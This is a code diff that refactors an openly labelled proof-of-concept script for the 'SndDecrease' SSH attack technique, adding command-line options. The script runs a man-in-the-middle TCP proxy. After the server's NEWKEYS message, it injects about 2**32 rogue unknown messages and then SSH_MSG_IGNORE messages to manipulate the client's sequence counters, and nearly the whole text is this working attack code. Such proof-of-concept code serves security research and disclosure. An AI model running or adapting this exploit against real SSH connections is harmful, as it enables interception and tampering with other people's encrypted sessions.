@@ -1,8 +1,11 @@
 #!/usr/bin/python3
 from binascii import unhexlify
-from common import contains_newkeys, run_tcp_mitm
-from tqdm import trange
 from time import sleep
+
+import click
+from tqdm import trange
+
+from common import contains_newkeys, run_tcp_mitm
 
 #####################################################################################
 ## Proof of Concept for the SndDecrease technique                                  ##
@@ -18,21 +21,22 @@ from time import sleep
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-# IP and port for the TCP proxy to bind to
-PROXY_IP = '127.0.0.1'
-PROXY_PORT = 2222
-
-# IP and port of the server
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 22
-
-# C.Snd will be decreased by N
-N = 1
-
 rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
 rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
 technique_in_progress = False
-def inject_snddecrease(in_socket, out_socket):
+
+@click.command()
+@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
+@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
+@click.option("--server-ip", help="The IP address where the SSH server is running.")
+@click.option("--server-port", default=22, help="The port where the SSH server is running.")
+@click.option("-N", "--decrease-by", default=1, help="The number by which C.Snd will be decreased.")
+def cli(proxy_ip, proxy_port, server_ip, server_port, decrease_by):
+    print("--- Proof of Concept for SndDecrease technique ---")
+    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
+    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_snddecrease(in_socket, out_socket, decrease_by), forward_client_to_server=pipe_discard_during_technique)
+
+def inject_snddecrease(in_socket, out_socket, decrease_by):
     global technique_in_progress
     try:
         while True:
@@ -40,11 +44,11 @@ def inject_snddecrease(in_socket, out_socket):
             if contains_newkeys(data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                 technique_in_progress = True
-                print(f"[+] Injecting 2**32 - {N} unknown messages to decrease C.Snd by {N}!")
-                for _ in trange(2**32 - N):
+                print(f"[+] Injecting 2**32 - {decrease_by} unknown messages to decrease C.Snd by {decrease_by}!")
+                for _ in trange(2**32 - decrease_by):
                     out_socket.send(rogue_unknown_msg)
-                print(f"[+] Injecting {N} SSH_MSG_IGNORE to fix C.Rcv!")
-                for _ in trange(N):
+                print(f"[+] Injecting {decrease_by} SSH_MSG_IGNORE to fix C.Rcv!")
+                for _ in trange(decrease_by):
                     out_socket.send(rogue_msg_ignore)
                 print("[+] Injection done, cooling down before continuing to forward traffic.")
                 # Rough workaround to avoid forwarding any unimplemented messages to the server
@@ -80,6 +84,4 @@ def pipe_discard_during_technique(in_socket, out_socket):
     out_socket.close()
 
 if __name__ == '__main__':
-    print("--- Proof of Concept for SndDecrease technique ---")
-    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
-    run_tcp_mitm(PROXY_IP, PROXY_PORT, SERVER_IP, SERVER_PORT, forward_server_to_client=inject_snddecrease, forward_client_to_server=pipe_discard_during_technique)
+    cli()
